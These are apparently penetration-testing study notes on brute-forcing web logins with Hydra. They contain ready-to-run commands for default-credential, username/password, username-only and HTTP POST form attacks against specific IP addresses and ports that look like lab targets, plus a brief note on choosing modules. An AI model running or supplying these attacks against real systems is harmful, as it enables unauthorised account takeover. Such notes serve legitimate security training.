# Login Attacks
## Default Passwords
```bash
$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

## Username/Password Attack
```bash
$ hydra -L /usr/share/wordlists/secLists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

## Username Brute Force
```bash
$ hydra -L /usr/share/wordlists/secLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```

## Brute Forcing Forms
In this situation there are only two types of http modules interesting for us:

- `http[s]-{head|get|post}`
- `http[s]-post-form`
The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like .php or .aspx and others.

To decide which module we need, we have to determine whether the web application uses GET or a POST form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form.


```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

- First: url
- Second: parameters to POST
- Third: form name

